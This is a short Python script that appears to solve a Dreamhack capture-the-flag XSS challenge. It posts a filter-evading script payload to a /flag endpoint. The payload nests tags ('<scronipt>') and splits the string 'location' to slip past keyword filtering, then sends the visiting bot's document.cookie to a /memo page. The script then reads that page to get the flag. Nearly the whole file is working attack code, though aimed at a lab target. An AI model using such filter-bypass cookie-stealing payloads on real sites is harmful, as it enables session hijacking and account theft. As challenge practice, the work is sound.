import requests

TEST_LOC = ""

if TEST_LOC == "local" :
    HOST = "http://127.0.0.1"
    PORT = "8000"
else : 
    HOST = "http://host3.dreamhack.games"
    PORT = "16665"

ATTACK_URI = "/flag"
# https://ar9ang3.tistory.com/31 에서 . 문자 필터링 기법 응용
PAYLOAD = "<scronipt>document['locatio'+'n'].href='/memo?memo='+document.cookie;</scronipt>"
POST_DATA = {"param" : PAYLOAD}
GET_FLAG = "/memo"

URL = HOST + ":" + PORT + ATTACK_URI

resp = requests.post(URL, data=POST_DATA)
print(resp.text)

URL = HOST + ":" + PORT + GET_FLAG

resp = requests.get(URL)
print(resp.text)